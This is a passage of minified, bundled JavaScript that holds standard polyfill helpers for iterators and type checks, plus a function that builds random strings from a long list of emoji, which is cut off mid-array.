p;!(s=f.next()).done;v++)u(n,v,y?i(f,h,[s.value,v],!0):s.value);return n.length=v,n}},function(e,t,n){var r=n(65);e.exports=function(e,t,n){if(r(e),void 0===t)return e;switch(n){case 0:return function(){return e.call(t)};case 1:return function(n){return e.call(t,n)};case 2:return function(n,r){return e.call(t,n,r)};case 3:return function(n,r,o){return e.call(t,n,r,o)}}return function(){return e.apply(t,arguments)}}},function(e,t){e.exports=function(e){if("function"!=typeof e)throw TypeError(String(e)+" is not a function");return e}},function(e,t,n){var r=n(5);e.exports=function(e,t,n,o){try{return o?t(r(n)[0],n[1]):t(n)}catch(t){var i=e.return;throw void 0!==i&&r(i.call(e)),t}}},function(e,t,n){var r=n(11),o=n(2)("iterator"),i=Array.prototype;e.exports=function(e){return void 0!==e&&(r.Array===e||i[o]===e)}},function(e,t,n){"use strict";var r=n(15),o=n(6),i=n(10);e.exports=function(e,t,n){var l=r(t);l in e?o.f(e,l,i(0,n)):e[l]=n}},function(e,t,n){var r=n(70),o=n(2)("iterator"),i=n(11);e.exports=function(e){if(null!=e)return e[o]||e["@@iterator"]||i[r(e)]}},function(e,t,n){var r=n(28),o=n(2)("toStringTag"),i="Arguments"==r(function(){return arguments}());e.exports=function(e){var t,n,l;return void 0===e?"Undefined":null===e?"Null":"string"==typeof(n=function(e,t){try{return e[t]}catch(e){}}(t=Object(e),o))?n:i?r(t):"Object"==(l=r(t))&&"function"==typeof t.callee?"Arguments":l}},function(e,t,n){e.exports=n(0)},function(e,t,n){var r=n(73);e.exports=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:0;return Array.from({length:Math.floor(Number(!0===e?0:e))||0},function(){return r[Math.floor(Math.random()*(r.length-1))]}).join("")}},function(e,t){e.exports=["🀄","🃏","🅰","🅱","🅾","🅿","🆎","🆑","🆒","🆓","🆔","🆕","🆖","🆗","🆘","🆙","🆚","🇦🇨","🇦🇩","🇦🇪","🇦🇫","🇦🇬","🇦🇮","🇦🇱","🇦🇲","🇦🇴","🇦🇶","🇦🇷","🇦🇸","🇦🇹","🇦🇺","🇦🇼","🇦🇽","🇦🇿","🇦","🇧🇦","🇧🇧","🇧🇩","🇧🇪","🇧🇫","🇧🇬","🇧🇭","🇧🇮","🇧🇯","🇧🇱","🇧🇲","🇧🇳","🇧🇴","🇧🇶","🇧🇷","🇧🇸","🇧🇹","🇧🇻","🇧🇼","🇧🇾","🇧🇿","🇧","🇨🇦","🇨🇨","🇨🇩","🇨🇫","🇨🇬","🇨🇭","🇨🇮","🇨🇰","🇨🇱","🇨🇲","🇨🇳","🇨🇴","🇨🇵","🇨🇷","🇨🇺","🇨🇻","🇨🇼","🇨🇽","🇨🇾","🇨🇿","🇨","🇩🇪","🇩🇬","🇩🇯","🇩🇰","🇩🇲","🇩🇴","🇩🇿","🇩","🇪🇦","🇪🇨","🇪🇪","🇪🇬","🇪🇭","🇪🇷","🇪🇸","🇪🇹","🇪🇺","🇪","🇫🇮","🇫🇯","🇫🇰","🇫🇲","🇫🇴","🇫🇷","🇫","🇬🇦","🇬🇧","🇬🇩","🇬🇪","🇬🇫","🇬🇬","🇬🇭","🇬🇮","🇬🇱","🇬🇲","🇬🇳","🇬🇵","🇬🇶","🇬🇷","🇬🇸","🇬🇹","🇬🇺","🇬🇼","🇬🇾","🇬","🇭🇰","🇭🇲","🇭🇳","🇭🇷","🇭🇹","🇭🇺","🇭","🇮🇨","🇮🇩","🇮🇪","🇮🇱","🇮🇲","🇮🇳","🇮🇴","🇮🇶","🇮🇷","🇮🇸","🇮🇹","🇮","🇯🇪","🇯🇲","🇯🇴","🇯🇵","🇯","🇰🇪","🇰🇬","🇰🇭","🇰🇮","🇰🇲","🇰🇳","🇰🇵","🇰🇷","🇰🇼","🇰🇾","🇰🇿","🇰","🇱🇦","🇱🇧","🇱🇨","🇱🇮","🇱🇰","🇱🇷","🇱🇸","🇱🇹","🇱🇺","🇱🇻","🇱🇾","🇱","🇲🇦","🇲🇨","🇲🇩","🇲🇪","🇲🇫","🇲🇬","🇲🇭","🇲🇰","🇲🇱","🇲🇲","🇲🇳","🇲🇴","🇲🇵","🇲🇶","🇲🇷","🇲🇸","🇲🇹","🇲🇺","🇲🇻","🇲🇼","🇲🇽","🇲🇾","🇲🇿","🇲","🇳🇦","🇳🇨","🇳🇪","🇳🇫","🇳🇬","🇳🇮","🇳🇱","🇳🇴","🇳🇵","🇳🇷","🇳🇺","🇳🇿","🇳","🇴🇲","🇴","🇵🇦","🇵🇪","🇵🇫","🇵🇬","🇵🇭","🇵🇰","🇵🇱","🇵🇲","🇵🇳","🇵🇷","🇵🇸","🇵🇹","🇵🇼","🇵🇾","🇵","🇶🇦","🇶","🇷🇪","🇷🇴","🇷🇸","🇷🇺","🇷🇼","🇷","🇸🇦","🇸🇧","🇸🇨","🇸🇩","🇸🇪","🇸🇬","🇸🇭","🇸🇮","🇸🇯","🇸🇰","🇸🇱","🇸🇲","🇸🇳","🇸🇴","🇸🇷","🇸🇸","🇸🇹","🇸🇻","🇸🇽","🇸🇾","🇸🇿","🇸","🇹🇦","🇹🇨","🇹🇩","🇹🇫","🇹🇬","🇹🇭","🇹🇯","🇹🇰","🇹🇱","🇹🇲","🇹🇳","🇹🇴","🇹🇷","🇹🇹","🇹🇻","🇹🇼","🇹🇿","🇹","🇺🇦","🇺🇬","🇺🇲","🇺🇳","🇺🇸","🇺🇾","🇺🇿","🇺","🇻🇦","🇻🇨","🇻🇪","🇻🇬","🇻🇮","🇻🇳","🇻🇺","🇻","🇼🇫","🇼🇸","🇼","🇽🇰","🇽","🇾🇪","🇾🇹","🇾","🇿🇦","🇿🇲","🇿🇼","🇿","🈁","🈂","🈚","🈯","🈲","🈳","🈴","🈵","🈶","🈷","🈸","🈹","🈺","🉐","🉑","🌀","🌁","🌂","🌃","🌄","🌅","🌆","🌇","🌈","🌉","🌊","🌋","🌌","🌍","🌎","🌏","🌐","🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘","🌙","🌚","🌛","🌜","🌝","🌞","🌟","🌠","🌡","🌤","🌥","🌦","🌧","🌨","🌩","🌪","🌫","🌬","🌭","🌮","🌯","🌰","🌱","🌲","🌳","🌴","🌵","🌶","🌷","🌸","🌹","🌺","🌻","🌼","🌽","🌾","🌿","🍀","🍁","🍂","🍃","🍄","🍅","🍆","🍇","🍈","🍉","🍊","🍋","🍌","🍍","🍎","🍏","🍐","🍑","🍒","🍓","🍔","🍕","🍖","🍗","🍘","🍙","🍚","🍛","🍜","🍝","🍞","🍟","🍠","🍡","🍢","🍣","🍤","🍥","🍦","🍧","🍨","🍩","🍪","🍫","🍬","🍭","🍮","🍯","🍰","🍱","🍲","🍳","🍴","🍵","🍶","🍷","🍸","🍹","🍺","🍻","🍼","🍽","🍾","🍿","🎀","🎁","🎂","🎃","🎄","🎅🏻","🎅🏼","🎅🏽","🎅🏾","🎅🏿","🎅","🎆","🎇","🎈","🎉","🎊","🎋","🎌","🎍","🎎","🎏","🎐","🎑","🎒","🎓","🎖","🎗","🎙","🎚","🎛","🎞","🎟","🎠","🎡","🎢","🎣","🎤","🎥","🎦","🎧","🎨","🎩","🎪","🎫","🎬","🎭","🎮","🎯","🎰","🎱","🎲","🎳","🎴","🎵","🎶","🎷","🎸","🎹","🎺","🎻","🎼","🎽","🎾","🎿","🏀","🏁","🏂🏻","🏂🏼","🏂🏽","🏂🏾","🏂🏿","🏂","🏃🏻‍♀️","🏃🏻‍♂️","🏃🏻","🏃🏼‍♀️","🏃🏼‍♂️","🏃🏼","🏃🏽‍♀️","🏃🏽‍♂️","🏃🏽","🏃🏾‍♀️","🏃🏾‍♂️","🏃🏾","🏃🏿‍♀️","🏃🏿‍♂️","🏃🏿","🏃‍♀️","🏃‍♂️","🏃","🏄🏻‍♀️","🏄🏻‍♂️","🏄🏻","🏄🏼‍♀️","🏄🏼‍♂️","🏄🏼","🏄🏽‍♀️","🏄🏽‍♂️","🏄🏽","🏄🏾‍♀️","🏄🏾‍♂️","🏄🏾","🏄🏿‍♀️","🏄🏿‍♂️","🏄🏿","🏄‍♀️","🏄‍♂️","🏄","🏅","🏆","🏇🏻","🏇🏼","🏇🏽","🏇🏾","🏇🏿","🏇","🏈","🏉","🏊🏻‍♀️","🏊🏻‍♂️","🏊🏻","🏊🏼‍♀️","🏊🏼‍♂️","🏊🏼","🏊🏽‍♀️","🏊🏽‍♂️","🏊🏽","🏊🏾‍♀️","🏊🏾‍♂️","🏊🏾","🏊🏿‍♀️","🏊🏿‍♂️","🏊🏿","🏊‍♀️","🏊‍♂️","🏊","🏋🏻‍♀️","🏋🏻‍♂️","🏋🏻","🏋🏼‍♀️","🏋🏼‍♂️","🏋🏼","🏋🏽‍♀️","🏋🏽‍♂️","🏋🏽","🏋🏾‍♀️","🏋🏾‍♂️","🏋🏾","🏋🏿‍♀️","🏋🏿‍♂️","🏋🏿","🏋️‍♀️","🏋️‍♂️","🏋","🏌🏻‍♀️","🏌🏻‍♂️","🏌🏻","🏌🏼‍♀️","🏌🏼‍♂️","🏌🏼","🏌🏽‍♀️","🏌🏽‍♂️","🏌🏽","🏌🏾‍♀️","🏌🏾‍♂️","🏌🏾","🏌🏿‍♀️","🏌🏿‍♂️","🏌🏿","🏌️‍♀️","🏌️‍♂️","🏌","🏍","🏎","🏏","🏐","🏑","🏒","🏓","🏔","🏕","🏖","🏗","🏘","🏙","🏚","🏛","🏜","🏝","🏞","🏟","🏠","🏡","🏢","🏣","🏤","🏥","🏦","🏧","🏨","🏩","🏪","🏫","🏬","🏭","🏮","🏯","🏰","🏳️‍🌈","🏳","🏴‍☠️","🏴","🏵","🏷","🏸","🏹","🏺","🏻","🏼","🏽","🏾","🏿","🐀","🐁","🐂","🐃","🐄","🐅","🐆","🐇","🐈","🐉","🐊","🐋","🐌","🐍","🐎","🐏","🐐","🐑","🐒","🐓","🐔","🐕","🐖","🐗","🐘","🐙","🐚","🐛","🐜","🐝","🐞","🐟","🐠","🐡","🐢","🐣","🐤","🐥","🐦","🐧","🐨","🐩","🐪","🐫","🐬","🐭","🐮","🐯","🐰","🐱","🐲","🐳","🐴","🐵","🐶","🐷","🐸","🐹","🐺","🐻","🐼","🐽","🐾","🐿","👀","👁‍🗨","👁","👂🏻","👂🏼","👂🏽","👂🏾","👂🏿","👂","👃🏻","👃🏼","👃🏽","👃🏾","👃🏿","👃","👄","👅","👆🏻","👆🏼","👆🏽","👆🏾","👆🏿","👆","👇🏻","👇🏼","👇🏽","👇🏾","👇🏿","👇","👈🏻","👈🏼","👈🏽","👈🏾","👈🏿","👈","👉🏻","👉🏼","👉🏽","👉🏾","👉🏿","👉","👊🏻","👊🏼","👊🏽","👊🏾","👊🏿","👊","👋🏻","👋🏼","👋🏽","👋🏾","👋🏿","👋","👌🏻","👌🏼","👌🏽","👌🏾","👌🏿","👌","👍🏻","👍🏼","👍🏽","👍🏾","👍🏿","👍","👎🏻","👎🏼","👎🏽","👎🏾","👎🏿","👎","👏🏻","👏🏼","👏🏽","👏🏾","👏🏿","👏","👐🏻","👐🏼","👐🏽","👐🏾","👐🏿","👐","👑","👒","👓","👔","👕","👖","👗","👘","👙","👚","👛","👜","👝","👞","👟","👠","👡","👢","👣","👤","👥","👦🏻","👦🏼","👦🏽","👦🏾","👦🏿","👦","👧🏻","👧🏼","👧🏽","👧🏾","👧🏿","👧","👨🏻‍🌾","👨🏻‍🍳","👨🏻‍🎓","👨🏻‍🎤","👨🏻‍🎨","👨🏻‍🏫","👨🏻‍🏭","👨🏻‍💻","👨🏻‍💼","👨🏻‍🔧","👨🏻‍🔬","👨🏻‍🚀","👨🏻‍🚒","👨🏻‍⚕️","👨🏻‍⚖️","👨🏻‍✈️","👨🏻","👨🏼‍🌾","👨🏼‍🍳","👨🏼‍🎓","👨🏼‍🎤","👨🏼‍🎨","👨🏼‍🏫","👨🏼‍🏭","👨🏼‍💻","👨🏼‍💼","👨🏼‍🔧","👨🏼‍🔬","👨🏼‍🚀","👨🏼‍🚒","👨🏼‍⚕️","👨🏼‍⚖️","👨🏼‍✈️","👨🏼","👨🏽‍🌾","👨🏽‍🍳","👨🏽‍🎓","👨🏽‍🎤","👨🏽‍🎨","👨🏽‍🏫","👨🏽‍🏭","👨🏽‍💻","👨🏽‍💼","👨🏽‍🔧","👨🏽‍🔬","👨🏽‍🚀","👨🏽‍🚒","👨🏽‍⚕️","👨🏽‍⚖️","👨🏽‍✈️","👨🏽","👨🏾‍🌾","👨🏾‍🍳","👨🏾‍🎓","👨🏾‍🎤","👨🏾‍🎨","👨🏾‍🏫","👨🏾‍🏭","👨🏾‍💻","👨🏾‍💼","👨🏾‍🔧","👨🏾‍🔬","👨🏾‍🚀","👨🏾‍🚒","👨🏾‍⚕️","👨🏾‍⚖️","👨🏾‍✈️","👨🏾","👨🏿‍🌾","👨🏿‍🍳","👨🏿‍🎓","👨🏿‍🎤","👨🏿‍🎨","👨🏿‍🏫","👨🏿‍🏭","👨🏿‍💻","👨🏿‍💼","👨🏿‍🔧","👨🏿‍🔬","👨🏿‍🚀","👨🏿‍🚒","👨🏿‍⚕️","👨🏿‍⚖️","👨🏿‍✈️","👨🏿","👨‍🌾","👨‍🍳","👨‍🎓","👨‍🎤","👨‍🎨","👨‍🏫","👨‍🏭","👨‍👦‍👦","👨‍👦","👨‍👧‍👦","👨‍👧‍👧","👨‍👧","👨‍👨‍👦‍👦","👨‍👨‍👦","👨‍👨‍👧‍👦","👨‍👨‍👧‍👧","👨‍👨‍👧","👨‍👩‍👦‍👦","👨‍👩‍👦","👨‍👩‍👧‍👦","👨‍👩‍👧‍👧","👨‍👩‍👧","👨‍💻","👨‍💼","👨‍🔧","👨‍🔬","👨‍🚀","👨‍🚒","👨‍⚕️","👨‍⚖️","👨‍✈️","👨‍❤️‍👨","👨‍❤️‍💋‍👨","👨","👩🏻‍🌾","👩🏻‍🍳","👩🏻‍🎓","👩🏻‍🎤","👩🏻‍🎨","👩🏻‍🏫","👩🏻‍🏭","👩🏻‍💻","👩🏻‍💼","👩🏻‍🔧","👩🏻‍🔬","👩🏻‍🚀","👩🏻‍🚒","👩🏻‍⚕️","👩🏻‍⚖️","👩🏻‍✈️","👩🏻","👩🏼‍🌾","👩🏼‍🍳","👩🏼‍🎓","👩🏼‍🎤","👩🏼‍🎨","👩🏼‍🏫","👩🏼‍🏭","👩🏼‍💻","👩🏼‍💼","👩🏼‍🔧","👩🏼‍🔬","👩🏼‍🚀","👩🏼‍🚒","👩🏼‍⚕️","👩🏼‍⚖️","👩🏼‍✈️","👩🏼","👩🏽‍🌾","👩🏽‍🍳","👩🏽‍🎓","👩🏽‍🎤","👩🏽‍🎨","👩🏽‍🏫","👩🏽‍🏭","👩🏽‍💻","👩🏽‍💼","👩🏽‍🔧","👩🏽‍🔬","👩🏽‍🚀","👩🏽‍🚒","👩🏽‍⚕️","👩🏽‍⚖️","👩🏽‍✈️","👩🏽","👩🏾‍🌾","👩🏾‍🍳","👩🏾‍🎓","👩🏾‍🎤","👩🏾‍🎨","👩🏾‍🏫","👩🏾‍🏭","👩🏾‍💻","👩🏾‍💼","👩🏾‍🔧","👩🏾‍🔬","👩🏾‍🚀","👩🏾‍🚒","👩🏾‍⚕️","👩🏾‍⚖️","👩🏾‍✈️","👩🏾","👩🏿‍🌾","👩🏿‍🍳","👩🏿‍🎓","👩🏿‍🎤","👩🏿‍🎨","👩🏿‍🏫","👩🏿‍🏭","👩🏿‍💻","👩🏿‍💼","👩🏿‍🔧","👩🏿‍🔬","👩🏿‍🚀","👩🏿‍🚒","👩🏿‍⚕️","👩🏿‍⚖️","👩🏿‍✈️","👩🏿","👩‍🌾","👩‍🍳","👩‍🎓","👩‍🎤","👩‍🎨","👩‍🏫","👩‍🏭","👩‍👦‍👦","👩‍👦","👩‍👧‍👦","👩‍👧‍👧","👩‍👧","👩‍👩‍👦‍👦","👩‍👩‍👦","👩‍👩‍👧‍👦","👩‍👩‍👧‍👧","👩‍👩‍👧","👩‍💻","👩‍💼","👩‍🔧","👩‍🔬","👩‍🚀","👩‍🚒","👩‍⚕️","👩‍⚖️","👩‍✈️","👩‍❤️‍👨","👩‍❤️‍👩","👩‍❤️‍💋‍👨","👩‍❤️‍💋‍👩","👩","👪🏻","👪🏼","👪🏽","👪🏾","👪🏿","👪","👫🏻","👫🏼","👫🏽","👫🏾","👫🏿","👫","👬🏻","👬🏼","👬🏽","👬🏾","👬🏿","👬","👭🏻","👭🏼","👭🏽","👭🏾","👭🏿","👭","👮🏻‍♀️","👮🏻‍♂️","👮🏻","👮🏼‍♀️","👮🏼‍♂️","👮🏼","👮🏽‍♀️","👮🏽‍♂️","👮🏽","👮🏾‍♀️","👮🏾‍♂️","👮🏾","👮🏿‍♀️","👮🏿‍♂️","👮🏿","👮‍♀️","👮‍♂️","👮","👯🏻‍♀️","👯🏻‍♂️","👯🏻","👯🏼‍♀️","👯🏼‍♂️","👯🏼","👯🏽‍♀️","👯🏽‍♂️","👯🏽","👯🏾‍♀️","👯🏾‍♂️","👯🏾","👯🏿‍♀️","👯🏿‍♂️","👯🏿","👯‍♀️","👯‍♂️","👯","👰🏻","👰🏼","👰🏽","👰🏾","👰🏿","👰","👱🏻‍♀️","👱🏻‍♂️","👱🏻","👱🏼‍♀️","👱🏼‍♂️","👱🏼","👱🏽‍♀️","👱🏽‍♂️","👱🏽","👱🏾‍♀️","👱🏾‍♂️","👱🏾","👱🏿‍♀️","👱🏿‍♂️","👱🏿","👱‍♀️","👱‍♂️","👱","👲🏻","👲🏼","👲🏽","👲🏾","👲🏿","👲","👳🏻‍♀️","👳🏻‍♂️","👳🏻","👳🏼‍♀️","👳🏼‍♂️","👳🏼","👳🏽‍♀️","👳🏽‍♂️","👳🏽","👳🏾‍♀️","👳🏾‍♂️","👳🏾","👳🏿‍♀️","👳🏿‍♂️","👳🏿","👳‍♀️","👳‍♂️","👳","👴🏻","👴🏼","👴🏽","👴🏾","👴🏿","👴","👵🏻","👵🏼","👵🏽","👵🏾","👵🏿","👵","👶🏻","👶🏼","👶🏽","👶🏾","👶🏿","👶","👷🏻‍♀️","👷🏻‍♂️","👷🏻","👷🏼‍♀️","👷🏼‍♂️","👷🏼","👷🏽‍♀️","👷🏽‍♂️","👷🏽","👷🏾‍♀️","👷🏾‍♂️","👷🏾","👷🏿‍♀️","👷🏿‍♂️","👷🏿","👷‍♀️","👷‍♂️","👷","👸🏻","👸🏼","👸🏽","👸🏾","👸🏿","👸","👹","👺","👻","👼🏻","👼🏼","👼🏽","👼🏾","👼🏿","👼","👽","👾","👿","💀","💁🏻‍♀️","💁🏻‍♂️","💁🏻","💁🏼‍♀️","💁🏼‍♂️","💁🏼","💁🏽‍♀️","💁🏽‍♂️","💁🏽","💁🏾‍♀️","💁🏾‍♂️","💁🏾","💁🏿‍♀️","💁🏿‍♂️","💁🏿","💁‍♀️","💁‍♂️","💁","💂🏻‍♀️","💂🏻‍♂️","💂🏻","💂🏼‍♀️","💂🏼‍♂️","💂🏼","💂🏽‍♀️","💂🏽‍♂️","💂🏽","💂🏾‍♀️","💂🏾‍♂️","💂🏾","💂🏿‍♀️","💂🏿‍♂️","💂🏿","💂‍♀️","💂‍♂️","💂","💃🏻","💃🏼","💃🏽","💃🏾","💃🏿","💃","💄","💅🏻","💅🏼","💅🏽","💅🏾","💅🏿","💅","💆🏻‍♀️","💆🏻‍♂️","💆🏻","💆🏼‍♀️","💆🏼‍♂️","💆🏼","💆🏽‍♀️","💆🏽‍♂️","💆🏽","💆🏾‍♀️","💆🏾‍♂️","💆🏾","💆🏿‍♀️","💆🏿‍♂️","💆🏿","💆‍♀️","💆‍♂️","💆","💇🏻‍♀️","💇🏻‍♂️","💇🏻","💇🏼‍♀️","💇🏼‍♂️","💇🏼","💇🏽‍♀️","💇🏽‍♂️","💇🏽","💇🏾‍♀️","💇🏾‍♂️","💇🏾","💇🏿‍♀️","💇🏿‍♂️","💇🏿","💇‍♀️","💇‍♂️","💇","💈","💉","💊","💋","💌","💍","💎","💏","💐","💑","💒","💓","💔","💕","💖","💗","💘","💙","💚","💛","💜","💝","💞","💟","💠","💡","💢","💣","💤","💥","💦","💧","💨","💩","💪🏻","💪🏼","💪🏽","💪🏾","💪🏿","💪","💫","💬","💭","💮","💯","💰","💱","💲","💳","💴","💵","💶","💷","💸","💹","💺","💻","💼","💽","💾","💿","📀","📁","📂","📃","📄","📅","📆","📇","📈","📉","📊","📋","📌","📍","📎","📏","📐","📑","📒","📓","📔","📕","📖","📗","📘","📙","📚","📛","📜","📝","📞","📟","📠","📡","📢","📣","📤","📥","📦","📧","📨","📩","📪","📫","📬","📭","📮","📯","📰","📱","📲","📳","📴","📵","📶","📷","📸","📹","📺","📻","📼","📽","📿","🔀","🔁","🔂","🔃","🔄","🔅","🔆","🔇","🔈","🔉","🔊","🔋","🔌","🔍","🔎","🔏","🔐","🔑","🔒","🔓","🔔","🔕","🔖","🔗","🔘","🔙","🔚","🔛","🔜","🔝","🔞","🔟","🔠","🔡","🔢","🔣","🔤","🔥","🔦","🔧","🔨","🔩","🔪","🔫","🔬","🔭","🔮","🔯","🔰","🔱","🔲","🔳","🔴","🔵","🔶","🔷","🔸","🔹","🔺","🔻","🔼","🔽","🕉","🕊","🕋","🕌","🕍","🕎","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚","🕛","🕜","🕝","🕞","🕟","🕠","🕡","🕢","🕣","🕤","🕥","🕦","🕧","🕯","🕰","🕳","🕴🏻","🕴🏼","🕴🏽","🕴🏾","🕴🏿","🕴","🕵🏻‍♀️","🕵🏻‍♂️","🕵🏻","🕵🏼‍♀️","🕵🏼‍♂️","🕵🏼","🕵🏽‍♀️","🕵🏽‍♂️","🕵🏽","🕵🏾‍♀️","🕵🏾‍♂️","🕵🏾","🕵🏿‍♀️","🕵🏿‍♂️","🕵🏿","🕵️‍♀️","🕵️‍♂️","🕵","🕶","🕷","🕸","🕹","🕺🏻","🕺🏼","🕺🏽","🕺🏾","🕺🏿","🕺","🖇","🖊","🖋","🖌","🖍","🖐🏻","🖐🏼","🖐🏽","🖐🏾","🖐🏿","🖐","🖕🏻","🖕🏼","🖕🏽","🖕🏾","🖕🏿","🖕","🖖🏻","🖖🏼","🖖🏽","🖖🏾","🖖🏿","🖖","🖤","🖥","🖨","🖱","🖲","🖼","🗂","🗃","🗄","🗑","🗒","🗓","🗜","🗝","🗞","🗡","🗣","🗨","🗯","🗳","🗺","🗻","🗼","🗽","🗾","🗿","😀","😁","😂","😃","😄","😅","😆","😇","😈","😉","😊","😋","😌","😍","😎","😏","😐","😑","😒","😓","😔","😕","😖","😗","😘","😙","😚","😛","😜","😝","😞","😟","😠","😡","😢","😣","😤","😥","😦","😧","😨","😩","😪","😫","😬","😭","😮","😯","😰","😱","😲","😳","😴","😵","😶","😷","😸","😹","😺","😻","😼","😽","😾","😿","🙀","🙁","🙂","🙃","🙄","🙅🏻‍♀️","🙅🏻‍♂️","🙅🏻","🙅🏼‍♀️","🙅🏼‍♂️","🙅🏼","🙅🏽‍♀️","🙅🏽‍♂️","🙅🏽","🙅🏾‍♀️","🙅🏾‍♂️","🙅🏾","🙅🏿‍♀️","🙅🏿‍♂️","🙅🏿","🙅‍♀️","🙅‍♂️","🙅","🙆🏻‍♀️","🙆🏻‍♂️","🙆🏻","🙆🏼‍♀️","🙆🏼‍♂️","🙆🏼","🙆🏽‍♀️","🙆🏽‍♂️","🙆🏽","🙆🏾‍♀️","🙆🏾‍♂️","🙆🏾","🙆🏿‍♀️","🙆🏿‍♂️","🙆🏿","🙆‍♀️","🙆‍♂️","🙆","🙇🏻‍♀️","🙇🏻‍♂️","🙇🏻","🙇🏼‍♀️","🙇🏼‍♂️","🙇🏼","🙇🏽‍♀️","🙇🏽‍♂️","🙇🏽","🙇🏾‍♀️","🙇🏾‍♂️","🙇🏾","🙇🏿‍♀️","🙇🏿‍♂️","🙇🏿","🙇‍♀️","🙇‍♂️","🙇","🙈","🙉","🙊","🙋🏻‍♀️","🙋🏻‍♂️","🙋🏻","🙋🏼‍♀️","🙋🏼‍♂️","🙋🏼","🙋🏽‍♀️","🙋🏽‍♂️","🙋🏽","🙋🏾‍♀️","🙋🏾‍♂️","🙋🏾","🙋🏿‍♀️","🙋🏿‍♂️","🙋🏿","🙋‍♀️","🙋‍♂️","🙋","🙌🏻","🙌🏼","🙌🏽","🙌🏾","🙌🏿","🙌","🙍🏻‍♀️","🙍🏻‍♂️","🙍🏻","🙍🏼‍♀️","🙍🏼‍♂️","🙍🏼","🙍🏽‍♀️","🙍🏽‍♂️","🙍🏽","🙍🏾‍♀️","🙍🏾‍♂️","🙍🏾","🙍🏿‍♀️","🙍🏿‍♂️","🙍🏿","🙍‍♀️","🙍‍♂️","🙍","🙎🏻‍♀️","🙎🏻‍♂️","🙎🏻","🙎🏼‍♀️","🙎🏼‍♂️","🙎🏼","🙎🏽‍♀️","🙎🏽‍♂️","🙎🏽","🙎🏾‍♀️","🙎🏾‍♂️","🙎🏾","🙎🏿‍♀️","🙎🏿‍♂️","🙎🏿","🙎‍♀️","🙎‍♂️","🙎","🙏🏻","🙏🏼","🙏🏽","🙏🏾","🙏🏿","🙏","🚀","🚁","🚂","🚃","🚄","🚅","🚆","🚇","🚈","🚉","🚊","🚋","🚌","🚍","🚎","🚏","🚐","🚑","🚒","🚓","🚔","🚕","🚖","🚗","🚘","🚙","🚚","🚛","🚜","🚝","🚞","🚟","🚠","🚡","🚢","🚣🏻‍♀️","🚣🏻‍♂️","🚣🏻","🚣🏼‍♀️","🚣🏼‍♂️","🚣🏼","🚣🏽‍♀️","🚣🏽‍♂️","🚣🏽","🚣🏾‍♀️","🚣🏾‍♂️","🚣🏾","🚣🏿‍♀️","🚣🏿‍♂️","🚣🏿","🚣‍♀️","🚣‍♂️","🚣","🚤","🚥","🚦","🚧","🚨","🚩","🚪","🚫","🚬","🚭","🚮","🚯","🚰","🚱","🚲","🚳","🚴🏻‍♀️","🚴🏻‍♂️","🚴🏻","🚴🏼‍♀️","🚴🏼‍♂️","🚴🏼","🚴🏽‍♀️","🚴🏽‍♂️","🚴🏽","🚴🏾‍♀️","🚴🏾‍♂️","🚴🏾","🚴🏿‍♀️","🚴🏿‍♂️","🚴🏿","🚴‍♀️","🚴‍♂️","🚴","🚵🏻‍♀️","🚵🏻‍♂️","🚵🏻","🚵🏼‍♀️","🚵🏼‍♂️","🚵🏼","🚵🏽‍♀️","🚵🏽‍♂️","🚵🏽","🚵🏾‍♀️","🚵🏾‍♂️","🚵🏾","🚵🏿‍♀️","🚵🏿‍♂️","🚵🏿","🚵‍♀️","🚵‍♂️","🚵","🚶🏻‍♀️","🚶🏻‍♂️","🚶🏻","🚶🏼‍♀️","🚶🏼‍♂️","🚶🏼","🚶🏽‍♀️","🚶🏽‍♂️","🚶🏽","🚶🏾‍♀️","🚶🏾‍♂️","🚶🏾","🚶🏿‍♀️","🚶🏿‍♂️","🚶🏿","🚶‍♀️","🚶‍♂️","🚶","🚷","🚸","🚹","🚺","🚻","🚼","🚽","🚾","🚿","🛀🏻","🛀🏼","🛀🏽","🛀🏾","🛀🏿","🛀","🛁","🛂","🛃","🛄","🛅","🛋","🛌🏻","🛌🏼","🛌🏽","🛌🏾","🛌🏿","🛌","🛍","🛎","🛏","🛐","🛑","🛒","🛠","🛡","🛢","🛣","🛤","🛥","🛩","🛫","🛬","🛰","🛳","🛴","🛵","🛶","🤐","🤑","🤒","🤓","🤔","🤕","🤖","🤗","🤘🏻","🤘🏼","🤘🏽","🤘🏾","🤘🏿","🤘","🤙🏻","🤙🏼","🤙🏽","🤙🏾","🤙🏿","🤙","🤚🏻","🤚🏼","🤚🏽","🤚🏾","🤚🏿","🤚","🤛🏻","🤛🏼","🤛🏽","🤛🏾","🤛🏿","🤛","🤜🏻","🤜🏼","🤜🏽","🤜🏾","🤜🏿","🤜","🤝🏻","🤝🏼","🤝🏽","🤝🏾","🤝🏿","🤝","🤞🏻","🤞🏼","🤞🏽","🤞🏾","🤞🏿","🤞","🤠","🤡","🤢","🤣","🤤","🤥","🤦🏻‍♀️","🤦🏻‍♂️","🤦🏻","🤦🏼‍♀️","🤦🏼‍♂️","🤦🏼","🤦🏽‍♀️","🤦🏽‍♂️","🤦🏽","🤦🏾‍♀️","🤦🏾‍♂️","🤦🏾","🤦🏿‍♀️","🤦🏿‍♂️","🤦🏿","🤦‍♀️","🤦‍♂️","🤦","🤧","🤰🏻","🤰🏼","🤰🏽","🤰🏾","🤰🏿","🤰","🤳🏻","🤳🏼","🤳🏽","🤳🏾","🤳🏿","🤳","🤴🏻","🤴🏼","🤴🏽","🤴🏾","🤴🏿","🤴","🤵🏻","🤵🏼","🤵🏽","🤵🏾","🤵🏿","🤵","🤶🏻","🤶🏼","🤶🏽","🤶🏾","🤶🏿","🤶","🤷🏻‍♀️","🤷🏻‍♂️","🤷🏻","🤷🏼‍♀️","🤷🏼‍♂️","🤷🏼","🤷🏽‍♀️","🤷🏽‍♂️","🤷🏽","🤷🏾‍♀️","🤷🏾‍♂️","🤷🏾","🤷🏿‍♀️","🤷🏿‍♂️","🤷🏿","🤷‍♀️","🤷‍♂️","🤷","🤸🏻‍♀️","🤸🏻‍♂️","🤸🏻","🤸🏼‍♀️","🤸🏼‍♂️","🤸🏼","🤸🏽‍♀️","🤸🏽‍♂️","🤸🏽","🤸🏾‍♀️","🤸🏾‍♂️","🤸🏾","🤸🏿‍♀️","🤸🏿‍♂️","🤸🏿","🤸‍♀️","🤸‍♂️","🤸","🤹🏻‍♀️","🤹🏻‍♂️","🤹🏻","🤹🏼‍♀️","🤹🏼‍♂️","🤹🏼","🤹🏽‍♀️","🤹🏽‍♂️",